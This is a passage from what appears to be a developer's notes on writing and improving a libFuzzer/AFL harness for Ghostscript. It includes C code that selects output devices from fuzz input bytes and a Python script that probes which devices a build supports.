    "plibm","pxlmono","lips3","cdj850","pcxmono","ml600","ibmpro","alc9100",
    "ink_cov","lp9200c","hpdj310","tiffg32d","bitrgb","png48","lp2563",
    "epl2500","pnm","r4081","lips4","cdj880","pdfimage24","necp6","imagen",
    "ap3250","inkcov","lp9300","hpdj320","tiffg4","bitrgbtags","pngalpha",
    "lp3000c","epl2750","pnmraw","rinkj","lips4v","cdj890","pdfimage32"
};

int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    if (!data || size == 0) return 0;

    /* Need at least 3 bytes: color, interpolation, device index. */
    if (size < 3) return 0;

    /* Consume option bytes. */
    uint8_t color_byte = data[0];
    uint8_t interp_byte = data[1];
    uint8_t dev_byte = data[2];

    int color_scheme = (int)(color_byte % 63);          /* [0..62] */
    int do_interpolation = (interp_byte != 0);          /* any nonzero -> true */

    /* Pick device from list. */
    size_t dev_count = sizeof(k_devices) / sizeof(k_devices[0]);
    const char *device_target = k_devices[dev_byte % dev_count];

    /* Remaining bytes are the PDF stream. */
    const unsigned char *pdf_data = (const unsigned char *)(data + 3);
    size_t pdf_size = size - 3;

    /* Always write to /dev/null. */
    (void)fuzz_gs_device(pdf_data, pdf_size,
                         color_scheme,
                         device_target,
                         "/dev/null",
                         do_interpolation);
    return 0;
}



#ifdef USE_AFL

__AFL_FUZZ_INIT();

int main(int argc, char **argv) {
    // LLVMFuzzerInitialize(&argc, &argv); // No initializati
    __AFL_INIT();
    const uint8_t *buf = __AFL_FUZZ_TESTCASE_BUF;
    while (__AFL_LOOP(100000)) {
        int len = __AFL_FUZZ_TESTCASE_LEN;
        LLVMFuzzerTestOneInput(buf, (size_t)len);
    }
    return 0;
}

#endif

```

now, I need to gather a corpus for this which just sets the first bytes to default values for each pdf file, because then our corpus actually does something...

## Improving our fuzzer

Ok, so I now have this fuzzer here:

```

#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

#include "psi/iapi.h"
#include "psi/interp.h"
#include "psi/iminst.h"
#include "base/gserrors.h"

#include <signal.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>

#include <pthread.h>
#include <stdatomic.h>
#include <limits.h>

static const unsigned char *g_data;
static size_t g_size;



#define min(x, y) ((x) < (y) ? (x) : (y))

static int gs_stdin(void *inst, char *buf, int len)
{
    size_t to_copy = min(len, g_size);
    to_copy = min(INT_MAX, to_copy);

    memcpy(buf, g_data, to_copy);

    g_data += to_copy;
    g_size -= to_copy;

    return to_copy;
}

static int gs_stdnull(void *inst, const char *buf, int len)
{

    /* Just discard everything. */
    // return len;


    int written = fwrite(buf, 1, len, stdout);
    fflush(stdout);  // flush immediately if you want streaming behavior
    return written;

}












// Debugging...

struct capbuf { char *p; size_t n; };

static int stdin_empty(void *ctx, char *buf, int len) { return 0; }

static int cap_write(void *ctx, const char *buf, int len) {
    struct capbuf *c = (struct capbuf *)ctx;
    if (len <= 0) return 0;
    char *np = (char *)realloc(c->p, c->n + (size_t)len + 1);
    if (!np) return 0;
    c->p = np;
    memcpy(c->p + c->n, buf, (size_t)len);
    c->n += (size_t)len;
    c->p[c->n] = '\0';
    return len;
}

/* Call this at startup to enumerate available devices. */
int gs_list_devices(char ***names_out, int *count_out) {
    void *gs = NULL;
    int code, ecode;
    struct capbuf cap = {0};
    *names_out = NULL; *count_out = 0;

    /* Create instance; pass cap as the "caller_handle" so we can access it in callbacks */
    code = gsapi_new_instance(&gs, &cap);
    if (code < 0) return code;

    // gsapi_set_stdio(gs, stdin_empty, cap_write, cap_write);
    gsapi_set_stdio(gs, gs_stdin, gs_stdnull, gs_stdnull);
    gsapi_set_arg_encoding(gs, GS_ARG_ENCODING_UTF8);

    /* NODISPLAY, quiet, safe, and a null device to avoid side-effects */
    const char *args[] = {
        "gs",
        "-sICCProfilesDir=/usr/share/ghostscript/10.02.1/iccprofiles/",
        "-sGenericResourceDir=/usr/share/ghostscript/10.02.1/Resource/",
        "-I/tmp/gsinit_override/",
        "-dBATCH", "-dNOPAUSE",
        "-dSAFER",
        "-sDEVICE=nullpage", "-sOutputFile=/dev/null"
    };
    code = gsapi_init_with_args(gs, (int)(sizeof(args)/sizeof(args[0])), (char**)args);
    if (code < 0 && code != gs_error_Quit) { gsapi_delete_instance(gs); return code; }

    /* Print each device on its own line */
    const char *ps = "devicenames { dup =only (\\n) print } forall flush\n";
    code = gsapi_run_string(gs, ps, 0, &ecode);
    (void)ecode;

    gsapi_exit(gs);
    gsapi_delete_instance(gs);

    if (!cap.p) return 0;

    /* Split lines into a string array */
    int cap_count = 0;
    for (char *s = cap.p; *s; ++s) if (*s == '\n') cap_count++;
    char **names = (char**)calloc((size_t)cap_count, sizeof(char*));
    if (!names) { free(cap.p); return -1; }

    int idx = 0;
    char *save = NULL;
    for (char *line = strtok_r(cap.p, "\r\n", &save); line; line = strtok_r(NULL, "\r\n", &save)) {
        if (*line == 0) continue;
        names[idx++] = strdup(line);
    }
    *names_out = names;
    *count_out = idx;
    free(cap.p);
    return 0;
}














int fuzz_gs_device(
    const unsigned char *buf,
    size_t size,
    int color_scheme,
    const char *device_target,
    const char *output_file,
    int do_interpolation
)
{

    /*
    char **devs = NULL;
    int ndev = 0;
    if (gs_list_devices(&devs, &ndev) == 0) {
        fprintf(stderr, "libgs has %d devices\n", ndev);
        for (int i = 0; i < ndev; i++) fprintf(stderr, "  %s\n", devs[i]);

    }
    */
    // return 0;

    int ret;
    void *gs = NULL;
    char color_space[50];
    char gs_device[50];
    char gs_o[100];
    char opt_interpolation[50];
    /*
     * We are expecting color_scheme to be in the [0:62] interval.
     * This corresponds to the color schemes defined here:
     * https://github.com/ArtifexSoftware/ghostpdl/blob/8c97d5adce0040ac38a1fb4d7954499c65f582ff/cups/libs/cups/raster.h#L102
     */
    sprintf(color_space, "-dcupsColorSpace=%d", color_scheme);
    sprintf(gs_device, "-sDEVICE=%s", device_target);
    sprintf(gs_o, "-sOutputFile=%s", output_file);
    if (do_interpolation) {
        sprintf(opt_interpolation, "-dDOINTERPOLATE");
    }
    else {
        sprintf(opt_interpolation, "-dNOINTERPOLATE");
    }
    /* Mostly stolen from cups-filters gstoraster. */
    char *args[] = {
        "gs",
        // "-q",
        "-sICCProfilesDir=/usr/share/ghostscript/10.02.1/iccprofiles/",
        "-sGenericResourceDir=/usr/share/ghostscript/10.02.1/Resource/",
        "-I/tmp/gsinit_override/",
        "-K1048576",
        "-r200x200",
        "-sBandListStorage=memory",
        "-dMaxBitmap=0",
        "-dBufferSpace=450k",
        "-dMediaPosition=1",
        color_space,
        //"-dQUIET",
        "-dSAFER",
        "-dNOPAUSE",
        "-dBATCH",
        opt_interpolation,
        // "-dNOMEDIAATTRS",
        //"-sstdout=%%stderr",
        gs_o,
        gs_device,
        "-_",
    };
    int argc = sizeof(args) / sizeof(args[0]);

    /* Stash buffers globally, for gs_stdin(). */
    g_data = buf;
    g_size = size;

    ret = gsapi_new_instance(&gs, NULL);
    if (ret < 0) {
        fprintf(stderr, "gsapi_new_instance: error %d\n", ret);
        return ret;
    }

    gsapi_set_stdio(gs, gs_stdin, gs_stdnull, gs_stdnull);
    ret = gsapi_set_arg_encoding(gs, GS_ARG_ENCODING_UTF8);
    if (ret < 0) {
        fprintf(stderr, "gsapi_set_arg_encoding: error %d\n", ret);
        gsapi_delete_instance(gs);
        return ret;
    }

    ret = gsapi_init_with_args(gs, argc, args);
    if (ret && ret != gs_error_Quit)
        /* Just keep going, to cleanup. */
        fprintf(stderr, "gsapi_init_with_args: error %d\n", ret);

    ret = gsapi_exit(gs);
    if (ret < 0 && ret != gs_error_Quit) {
        fprintf(stderr, "gsapi_exit: error %d\n", ret);
        return ret;
    }

    gsapi_delete_instance(gs);

    return 0;
}



/* Pick target device from this list (no leading '/'). Got from "gs -h" */
static const char *devices[] = {
    "npdl","itk24i","appledmp","jpeg","lp9400","hpdj340","tiffgray","bmp16",
    "pnggray","lp7500","epl5800","ppm","rpdl","lj250","cdj970","pdfimage8",
    "oce9050","itk38","atx23","jpegcmyk","lp9500c","hpdj400","tifflzw",
    "bmp16m","pngmono","lp7700","epl5900","ppmraw","samsunggdi","lj3100sw",
    "cdjcolor","pgm","oki182","iwhi","atx24","jpeggray","lp9600","hpdj500",
    "tiffpack","bmp256","pngmonod","lp7900","epl6100","ps2write","sj48",
    "lj4dith","cdjmono","pgmraw","oki4w","iwlo","atx38","mgr4","lp9600s",
    "hpdj500c","tiffscaled","bmp32b","ocr","lp8000","epl6200","pdfwrite",
    "display","st800","lj4dithp","cdnj500","pgnm","okiibm","iwlq","bj10e",
    "mgr8","lp9800c","hpdj510","tiffscaled24","bmpgray","hocr","lp8000c",
    "eplcolor","psdcmyk","x11","stcolor","lj5gray","chp2200","pgnmraw",
    "oprp","jetp3852","bj10v","mgrgray2","lps4500","hpdj520","tiffscaled32",
    "bmpmono","pdfocr8","lp8100","eplmono","psdcmyk16","x11alpha","t4693d2",
    "lj5mono","cljet5","pkm","opvp","jj100","bj10vh","mgrgray4","lps6500",
    "hpdj540","tiffscaled4","bmpsep1","pdfocr24","lp8200c","eps9high",
    "psdcmykog","x11cmyk","t4693d4","ljet2p","cljet5c","pkmraw","paintjet",
    "la50","bj200","mgrgray8","lq850","hpdj550c","tiffscaled8","bmpsep8",
    "pdfocr32","lp8300c","eps9mid","psdcmyktags","x11cmyk2","t4693d8",
    "ljet3","cljet5pr","pksm","pcl3","la70","bjc600","mgrmono","lxm3200",
    "hpdj560c","tiffsep","ccr","nullpage","lp8300f","epson","psdcmyktags16",
    "x11cmyk4","tek4696","ljet3d","coslw2p","pksmraw","photoex","la75",
    "bjc800","miff24","lxm5700m","hpdj600","tiffsep1","cfax","lp8400f",
    "epsonc","psdrgb","x11cmyk8","uniprint","ljet4","coslwxl","plan",
    "picty180","la75plus","bjc880j","pam","m8510","hpdj660c","txtwrite",
    "cif","lp8500c","escp","psdrgb16","x11gray2","xes","ljet4d","declj250",
    "plan9bm","pj","laserjet","bjccmyk","pamcmyk32","md1xMono","hpdj670c",
    "xcf","devicen","lp8600","escpage","psdrgbtags","x11gray4","appleraster",
    "ljet4pjl","deskjet","planc","pjetxl","lbp310","bjccolor","pamcmyk4",
    "md2k","hpdj680c","xcfcmyk","dfaxhigh","lp8600f","fmlbp","spotcmyk",
    "x11mono","cups","ljetplus","dj505j","plang","pjxl","lbp320","bjcgray",
    "pbm","md50Eco","hpdj690c","xpswrite","dfaxlow","lp8700","fmpr",
    "tiff12nc","x11rg16x","pwgraster","ln03","djet500","plank","pjxl300",
    "lbp8","bjcmono","pbmraw","md50Mono","hpdj850c","alc1900","eps2write",
    "lp8800c","fs600","tiff24nc","x11rg32x","urf","lp1800","djet500c",
    "planm","pr1000","lex2050","cdeskjet","pcx16","md5k","hpdj855c",
    "alc2000","faxg3","lp8900","gdi","tiff32nc","pclm","ijs","lp1900",
    "dl2100","plib","pr1000_4","lex3200","cdj1600","pcx24b","mj500c",
    "hpdj870c","alc4000","faxg32d","lp9000b","hl1240","tiff48nc","pclm8",
    "png16","lp2000","dnj650c","plibc","pr150","lex5700","cdj500","pcx256",
    "mj6000c","hpdj890c","alc4100","faxg4","lp9000c","hl1250","tiff64nc",
    "bbox","png16m","lp2200","epl2050","plibg","pr201","lex7000","cdj550",
    "pcxcmyk","mj700v2c","hpdjplus","alc8500","fpng","lp9100","hl7x0",
    "tiffcrle","bit","png16malpha","lp2400","epl2050p","plibk","pxlcolor",
    "lips2p","cdj670","pcxgray","mj8000c","hpdjportable","alc8600","inferno",
    "lp9200b","hpdj1120c","tiffg3","bitcmyk","png256","lp2500","epl2120",
    "plibm","pxlmono","lips3","cdj850","pcxmono","ml600","ibmpro","alc9100",
    "ink_cov","lp9200c","hpdj310","tiffg32d","bitrgb","png48","lp2563",
    "epl2500","pnm","r4081","lips4","cdj880","pdfimage24","necp6","imagen",
    "ap3250","inkcov","lp9300","hpdj320","tiffg4","bitrgbtags","pngalpha",
    "lp3000c","epl2750","pnmraw","rinkj","lips4v","cdj890","pdfimage32"
};

int n_devices = 362; // The number of devices...

int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    /* Bail early if the header isn't present */
    if (size < 4) return 0;

    /* Consume option bytes. */
    uint8_t  color_byte  = data[0];
    uint8_t  interp_byte = data[1];
    uint16_t dev_word    = (uint16_t)data[2] | ((uint16_t)data[3] << 8);  /* LE */

    /* Map to params */
    int color_scheme     = (int)(color_byte % 63);     /* [0..62] */
    int do_interpolation = (interp_byte != 0);         /* any nonzero -> true */

    /* Use the 16-bit device index (modulo the number of compiled-in devices) */
    int dev_index = (int)(dev_word % n_devices);       /* n_devices = array length */
    const char *device_target = devices[dev_index];

    /* The rest is the PDF payload */
    const uint8_t *pdf_data = data + 4;
    size_t         pdf_size = size - 4;

    /* Always write to /dev/null. */
    (void)fuzz_gs_device(pdf_data, pdf_size,
                         color_scheme,
                         device_target,
                         "/dev/null",
                         do_interpolation);
    return 0;
}



#ifdef USE_AFL

__AFL_FUZZ_INIT();

int main(int argc, char **argv) {
    // LLVMFuzzerInitialize(&argc, &argv); // No initializati
    __AFL_INIT();
    const uint8_t *buf = __AFL_FUZZ_TESTCASE_BUF;
    while (__AFL_LOOP(100000)) {
        int len = __AFL_FUZZ_TESTCASE_LEN;
        LLVMFuzzerTestOneInput(buf, (size_t)len);
    }
    return 0;
}

#endif


```

but there are some certain problems with it. First of all, it doesn't reuse the instance of gs on the next iterations and instead it just does the thing... also there are still some devices still missing. I actually need to download some libraries for all of the output devices to be installed correctly, so I need to do that.

Here are the libraries which I need:

```
configure expects:
ghostpdl/extract
ghostpdl/leptonica
ghostpdl/tesseract
```

so I downloaded all of them and now I am going to try to compile again...

## Fixing some stuff.

I also made this script here:

```
oof@elskun-lppri:~/ghostpdlafl$ cat probe_devices.py
#!/usr/bin/env python3
import argparse
import os
import shlex
import subprocess
import sys
import tempfile

# Full device list (order kept; without leading slashes)
DEVICES = [
    "npdl","itk24i","appledmp","jpeg","lp9400","hpdj340","tiffgray","bmp16","pnggray","lp7500","epl5800","ppm","rpdl","lj250","cdj970","pdfimage8","oce9050","itk38","atx23","jpegcmyk","lp9500c","hpdj400","tifflzw","bmp16m","pngmono","lp7700","epl5900","ppmraw","samsunggdi","lj3100sw","cdjcolor","pgm","oki182","iwhi","atx24","jpeggray","lp9600","hpdj500","tiffpack","bmp256","pngmonod","lp7900","epl6100","ps2write","sj48","lj4dith","cdjmono","pgmraw","oki4w","iwlo","atx38","mgr4","lp9600s","hpdj500c","tiffscaled","bmp32b","ocr","lp8000","epl6200","pdfwrite","display","st800","lj4dithp","cdnj500","pgnm","okiibm","iwlq","bj10e","mgr8","lp9800c","hpdj510","tiffscaled24","bmpgray","hocr","lp8000c","eplcolor","psdcmyk","x11","stcolor","lj5gray","chp2200","pgnmraw","oprp","jetp3852","bj10v","mgrgray2","lps4500","hpdj520","tiffscaled32","bmpmono","pdfocr8","lp8100","eplmono","psdcmyk16","x11alpha","t4693d2","lj5mono","cljet5","pkm","opvp","jj100","bj10vh","mgrgray4","lps6500","hpdj540","tiffscaled4","bmpsep1","pdfocr24","lp8200c","eps9high","psdcmykog","x11cmyk","t4693d4","ljet2p","cljet5c","pkmraw","paintjet","la50","bj200","mgrgray8","lq850","hpdj550c","tiffscaled8","bmpsep8","pdfocr32","lp8300c","eps9mid","psdcmyktags","x11cmyk2","t4693d8","ljet3","cljet5pr","pksm","pcl3","la70","bjc600","mgrmono","lxm3200","hpdj560c","tiffsep","ccr","nullpage","lp8300f","epson","psdcmyktags16","x11cmyk4","tek4696","ljet3d","coslw2p","pksmraw","photoex","la75","bjc800","miff24","lxm5700m","hpdj600","tiffsep1","cfax","lp8400f","epsonc","psdrgb","x11cmyk8","uniprint","ljet4","coslwxl","plan","picty180","la75plus","bjc880j","pam","m8510","hpdj660c","txtwrite","cif","lp8500c","escp","psdrgb16","x11gray2","xes","ljet4d","declj250","plan9bm","pj","laserjet","bjccmyk","pamcmyk32","md1xMono","hpdj670c","xcf","devicen","lp8600","escpage","psdrgbtags","x11gray4","appleraster","ljet4pjl","deskjet","planc","pjetxl","lbp310","bjccolor","pamcmyk4","md2k","hpdj680c","xcfcmyk","dfaxhigh","lp8600f","fmlbp","spotcmyk","x11mono","cups","ljetplus","dj505j","plang","pjxl","lbp320","bjcgray","pbm","md50Eco","hpdj690c","xpswrite","dfaxlow","lp8700","fmpr","tiff12nc","x11rg16x","pwgraster","ln03","djet500","plank","pjxl300","lbp8","bjcmono","pbmraw","md50Mono","hpdj850c","alc1900","eps2write","lp8800c","fs600","tiff24nc","x11rg32x","urf","lp1800","djet500c","planm","pr1000","lex2050","cdeskjet","pcx16","md5k","hpdj855c","alc2000","faxg3","lp8900","gdi","tiff32nc","pclm","ijs","lp1900","dl2100","plib","pr1000_4","lex3200","cdj1600","pcx24b","mj500c","hpdj870c","alc4000","faxg32d","lp9000b","hl1240","tiff48nc","pclm8","png16","lp2000","dnj650c","plibc","pr150","lex5700","cdj500","pcx256","mj6000c","hpdj890c","alc4100","faxg4","lp9000c","hl1250","tiff64nc","bbox","png16m","lp2200","epl2050","plibg","pr201","lex7000","cdj550","pcxcmyk","mj700v2c","hpdjplus","alc8500","fpng","lp9100","hl7x0","tiffcrle","bit","png16malpha","lp2400","epl2050p","plibk","pxlcolor","lips2p","cdj670","pcxgray","mj8000c","hpdjportable","alc8600","inferno","lp9200b","hpdj1120c","tiffg3","bitcmyk","png256","lp2500","epl2120","plibm","pxlmono","lips3","cdj850","pcxmono","ml600","ibmpro","alc9100","ink_cov","lp9200c","hpdj310","tiffg32d","bitrgb","png48","lp2563","epl2500","pnm","r4081","lips4","cdj880","pdfimage24","necp6","imagen","ap3250","inkcov","lp9300","hpdj320","tiffg4","bitrgbtags","pngalpha","lp3000c","epl2750","pnmraw","rinkj","lips4v","cdj890","pdfimage32"
]

UNKNOWN_PATTERNS = (
    "Unknown device:",                 # Ghostscript text
    "gsapi_init_with_args: error -100" # often printed by your harness
)

def build_input(header_bytes, pdf_bytes):
    return bytes(header_bytes) + pdf_bytes

def main():
    ap = argparse.ArgumentParser(description="Probe which devices are recognized by the current Ghostscript build via your pdf_fuzzer harness.")
    ap.add_argument("pdf", help="Path to example PDF")
    ap.add_argument("--fuzzer", default="./pdf_fuzzer", help="Path to fuzzer executable (default: ./pdf_fuzzer)")
    ap.add_argument("--colorscheme", type=int, default=1, help="First header byte (color space id) [0..255] (default: 1)")
    ap.add_argument("--interp", type=int, default=0, help="Third header byte (0 or 1; anything nonzero means on) (default: 0)")
    ap.add_argument("--limit256", action="store_true",
                    help="Only probe the first 256 devices (recommended if your harness maps device by a single byte).")
    args = ap.parse_args()

    # Basic checks
    if not os.path.isfile(args.pdf):
        print(f"Input file not found: {args.pdf}", file=sys.stderr)
        sys.exit(2)
    if not os.path.isfile(args.fuzzer) or not os.access(args.fuzzer, os.X_OK):
        print(f"Fuzzer not executable: {args.fuzzer}", file=sys.stderr)
        sys.exit(2)

    with open(args.pdf, "rb") as f:
        pdf_bytes = f.read()

    # How many devices can we meaningfully address with a 1-byte index?
    max_devices = min(len(DEVICES), 256) if args.limit256 else len(DEVICES)
    ok = []
    unknown = []
    others = []

    print(f"Probing {max_devices} devices using: {args.fuzzer}")
    print("This may take a bit…")

    for idx in range(max_devices):
        dev_name = DEVICES[idx]
        idx16 = idx & 0xFFFF
        # 4-byte header: [color scheme, interpolation, device index (LE)]
        hdr = [args.colorscheme & 0xFF,
               args.interp & 0xFF,
               idx16 & 0xFF,
               (idx16 >> 8) & 0xFF]
        payload = build_input(hdr, pdf_bytes)

        # Write payload to a temp file so we can use shell redirection '<'
        with tempfile.NamedTemporaryFile(delete=False) as tf:
            tf.write(payload)
            temp_path = tf.name

        cmd = f"{shlex.quote(args.fuzzer)} < {shlex.quote(temp_path)}"
        try:
            out = subprocess.check_output(
                cmd,
                shell=True,
                stderr=subprocess.STDOUT
            )
            text = out.decode("utf-8", errors="replace")
            print("Text: "+str(text))
            # If we got here, exit code was 0; still sanity-check for the “Unknown device” text
            if any(pat in text for pat in UNKNOWN_PATTERNS):
                unknown.append((idx, dev_name, text.strip()))
                status = "UNKNOWN (string)"
            else:
                ok.append((idx, dev_name))
                status = "OK"
        except subprocess.CalledProcessError as e:
            text = (e.output or b"").decode("utf-8", errors="replace")
            if any(pat in text for pat in UNKNOWN_PATTERNS):
                unknown.append((idx, dev_name, text.strip()))
                status = "UNKNOWN"
            else:
                others.append((idx, dev_name, e.returncode, text.strip()))
                status = f"ERR {e.returncode}"
        finally:
            try:
                os.unlink(temp_path)
            except OSError:
                pass

        print(f"[{idx:3d}] {dev_name:15s} -> {status}")

    # Write results
    with open("devices_ok.txt", "w", encoding="utf-8") as f:
        for i, n in ok:
            f.write(f"{i}\t{n}\n")
    with open("devices_unknown.txt", "w", encoding="utf-8") as f:
        for i, n, msg in unknown:
            # keep it short
            first_line = msg.splitlines()[0] if msg else ""
            f.write(f"{i}\t{n}\t{first_line}\n")
    with open("devices_other_errors.txt", "w", encoding="utf-8") as f:
        for i, n, rc, msg in others:
            first_line = msg.splitlines()[0] if msg else ""
            f.write(f"{i}\t{n}\tret={rc}\t{first_line}\n")

    print("\n=== Summary ===")
    print(f"OK devices: {len(ok)}")
    print(f"Unknown devices: {len(unknown)}")
    print(f"Other errors: {len(others)}")
    if ok:
        print("\nFirst few OK devices:")
        for i, n in ok[:10]:
            print(f"  {i}\t{n}")
    print("\nSaved lists:")
    print("  devices_ok.txt")
    print("  devices_unknown.txt")
    print("  devices_other_errors.txt")

if __name__ == "__main__":
    main()
```

to check the different supported devices...

## Fixing up the devices

Ok, so I compiled the ghostpdl library with those extra libs, and now I have this here:

```
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

#include "psi/iapi.h"
#include "psi/interp.h"
#include "psi/iminst.h"
#include "base/gserrors.h"

#include <signal.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>

#include <pthread.h>
#include <stdatomic.h>
#include <limits.h>

static const unsigned char *g_data;
static size_t g_size;



#define min(x, y) ((x) < (y) ? (x) : (y))

static int gs_stdin(void *inst, char *buf, int len)
{
    size_t to_copy = min(len, g_size);
    to_copy = min(INT_MAX, to_copy);

    memcpy(buf, g_data, to_copy);

    g_data += to_copy;
    g_size -= to_copy;

    return to_copy;
}

static int gs_stdnull(void *inst, const char *buf, int len)
{

    /* Just discard everything. */
    // return len;


    int written = fwrite(buf, 1, len, stdout);
    fflush(stdout);  // flush immediately if you want streaming behavior
    return written;

}












// Debugging...

struct capbuf { char *p; size_t n; };

static int stdin_empty(void *ctx, char *buf, int len) { return 0; }

static int cap_write(void *ctx, const char *buf, int len) {
    struct capbuf *c = (struct capbuf *)ctx;
    if (len <= 0) return 0;
    char *np = (char *)realloc(c->p, c->n + (size_t)len + 1);
    if (!np) return 0;
    c->p = np;
    memcpy(c->p + c->n, buf, (size_t)len);
    c->n += (size_t)len;
    c->p[c->n] = '\0';
    return len;
}

/* Call this at startup to enumerate available devices. */
int gs_list_devices(char ***names_out, int *count_out) {
    void *gs = NULL;
    int code, ecode;
    struct capbuf cap = {0};
    *names_out = NULL; *count_out = 0;

    /* Create instance; pass cap as the "caller_handle" so we can access it in callbacks */
    code = gsapi_new_instance(&gs, &cap);
    if (code < 0) return code;

    // gsapi_set_stdio(gs, stdin_empty, cap_write, cap_write);
    gsapi_set_stdio(gs, gs_stdin, gs_stdnull, gs_stdnull);
    gsapi_set_arg_encoding(gs, GS_ARG_ENCODING_UTF8);

    /* NODISPLAY, quiet, safe, and a null device to avoid side-effects */
    const char *args[] = {
        "gs",
        "-sICCProfilesDir=/usr/share/ghostscript/10.02.1/iccprofiles/",
        "-sGenericResourceDir=/usr/share/ghostscript/10.02.1/Resource/",
        "-I/tmp/gsinit_override/",
        "-dBATCH", "-dNOPAUSE",
        "-dSAFER",
        "-sDEVICE=nullpage", "-sOutputFile=/dev/null"
    };
    code = gsapi_init_with_args(gs, (int)(sizeof(args)/sizeof(args[0])), (char**)args);
    if (code < 0 && code != gs_error_Quit) { gsapi_delete_instance(gs); return code; }

    /* Print each device on its own line */
    const char *ps = "devicenames { dup =only (\\n) print } forall flush\n";
    code = gsapi_run_string(gs, ps, 0, &ecode);
    (void)ecode;

    gsapi_exit(gs);
    gsapi_delete_instance(gs);

    if (!cap.p) return 0;

    /* Split lines into a string array */
    int cap_count = 0;
    for (char *s = cap.p; *s; ++s) if (*s == '\n') cap_count++;
    char **names = (char**)calloc((size_t)cap_count, sizeof(char*));
    if (!names) { free(cap.p); return -1; }

    int idx = 0;
    char *save = NULL;
    for (char *line = strtok_r(cap.p, "\r\n", &save); line; line = strtok_r(NULL, "\r\n", &save)) {
        if (*line == 0) continue;
        names[idx++] = strdup(line);
    }
    *names_out = names;
    *count_out = idx;
    free(cap.p);
    return 0;
}














int fuzz_gs_device(
    const unsigned char *buf,
    size_t size,
    int color_scheme,
    const char *device_target,
    const char *output_file,
    int do_interpolation
)
{

    /*
    char **devs = NULL;
    int ndev = 0;
    if (gs_list_devices(&devs, &ndev) == 0) {
        fprintf(stderr, "libgs has %d devices\n", ndev);
        for (int i = 0; i < ndev; i++) fprintf(stderr, "  %s\n", devs[i]);
    }
    */

    // return 0;

    int ret;
    void *gs = NULL;
    char color_space[50];
    char gs_device[50];
    char gs_o[100];
    char opt_interpolation[50];
    /*
     * We are expecting color_scheme to be in the [0:62] interval.
     * This corresponds to the color schemes defined here:
     * https://github.com/ArtifexSoftware/ghostpdl/blob/8c97d5adce0040ac38a1fb4d7954499c65f582ff/cups/libs/cups/raster.h#L102
     */
    sprintf(color_space, "-dcupsColorSpace=%d", color_scheme);
    sprintf(gs_device, "-sDEVICE=%s", device_target);
    sprintf(gs_o, "-sOutputFile=%s", output_file);
    if (do_interpolation) {
        sprintf(opt_interpolation, "-dDOINTERPOLATE");
    }
    else {
        sprintf(opt_interpolation, "-dNOINTERPOLATE");
    }
    /* Mostly stolen from cups-filters gstoraster. */
    char *args[] = {
        "gs",
        // "-q",
        "-sICCProfilesDir=/usr/share/ghostscript/10.02.1/iccprofiles/",
        "-sGenericResourceDir=/usr/share/ghostscript/10.02.1/Resource/",
        "-I/tmp/gsinit_override/",
        "-K1048576",
        "-r200x200",
        "-sBandListStorage=memory",
        "-dMaxBitmap=0",
        "-dBufferSpace=450k",
        "-dMediaPosition=1",
        color_space,
        //"-dQUIET",
        "-dSAFER",
        "-dNOPAUSE",
        "-dBATCH",
        opt_interpolation,
        // "-dNOMEDIAATTRS",
        //"-sstdout=%%stderr",
        gs_o,
        gs_device,
        "-_",
    };
    int argc = sizeof(args) / sizeof(args[0]);

    /* Stash buffers globally, for gs_stdin(). */
    g_data = buf;
    g_size = size;

    ret = gsapi_new_instance(&gs, NULL);
    if (ret < 0) {
        fprintf(stderr, "gsapi_new_instance: error %d\n", ret);
        return ret;
    }

    gsapi_set_stdio(gs, gs_stdin, gs_stdnull, gs_stdnull);
    ret = gsapi_set_arg_encoding(gs, GS_ARG_ENCODING_UTF8);
    if (ret < 0) {
        fprintf(stderr, "gsapi_set_arg_encoding: error %d\n", ret);
        gsapi_delete_instance(gs);
        return ret;
    }

    ret = gsapi_init_with_args(gs, argc, args);
    if (ret && ret != gs_error_Quit)
        /* Just keep going, to cleanup. */
        fprintf(stderr, "gsapi_init_with_args: error %d\n", ret);

    ret = gsapi_exit(gs);
    if (ret < 0 && ret != gs_error_Quit) {
        fprintf(stderr, "gsapi_exit: error %d\n", ret);
        return ret;
    }

    gsapi_delete_instance(gs);

    return 0;
}



/* Pick target device from this list (no leading '/'). Got from "gs -h" */
static const char *devices[] = {
    "lp9800c","hpdj550c","tiffsep1","dfaxhigh","hocr","lp8000c","eps9mid","psdrgb",
    "x11gray4","stcolor","lj5gray","cljet5pr","plan","oprp","jetp3852","bjc600",
    "pam","lps4500","hpdj560c","txtwrite","dfaxlow","pdfocr8","lp8100","epson",
    "psdrgb16","x11mono","t4693d2","lj5mono","coslw2p","plan9bm","opvp","jj100",
    "bjc800","pamcmyk32","lps6500","hpdj600","urfcmyk","display","pdfocr24","lp8200c",
    "epsonc","psdrgbtags","x11rg16x","t4693d4","ljet2p","coslwxl","planc","paintjet",
    "la50","bjc880j","pamcmyk4","lq850","hpdj660c","urfgray","docxwrite","pdfocr32",
    "lp8300c","escp","spotcmyk","x11rg32x","t4693d8","ljet3","declj250","plang",
    "pcl3","la70","bjccmyk","pbm","lxm3200","hpdj670c","urfrgb","eps2write",
    "nullpage","lp8300f","escpage","tiff12nc","pclm","tek4696","ljet3d","deskjet",
    "plank","photoex","la75","bjccolor","pbmraw","lxm5700m","hpdj680c","xcf",
    "pdfwrite","lp8400f","fmlbp","tiff24nc","pclm8","uniprint","ljet4","dj505j",
    "planm","picty180","la75plus","bjcgray","pcx16","m8510","hpdj690c","xpswrite",
    "faxg3","lp8500c","fmpr","tiff32nc","bit","xes","ljet4d","djet500",
    "plib","pj","laserjet","bjcmono","pcx24b","md1xMono","hpdj850c","alc1900",
    "faxg32d","lp8600","fs600","tiff48nc","bitcmyk","appleraster","ljet4pjl","djet500c",
    "plibc","pjetxl","lbp310","cdeskjet","pcx256","md2k","hpdj855c","alc2000",
    "faxg4","lp8600f","gdi","tiff64nc","bitrgb","cups","ljetplus","dl2100",
    "plibg","pjxl","lbp320","cdj1600","pcxcmyk","md50Eco","hpdj870c","alc4000",
    "fpng","lp8700","hl1240","tiffcrle","bitrgbtags","pwgraster","ln03","dnj650c",
    "plibk","pjxl300","lbp8","cdj500","pcxgray","md50Mono","hpdj890c","alc4100",
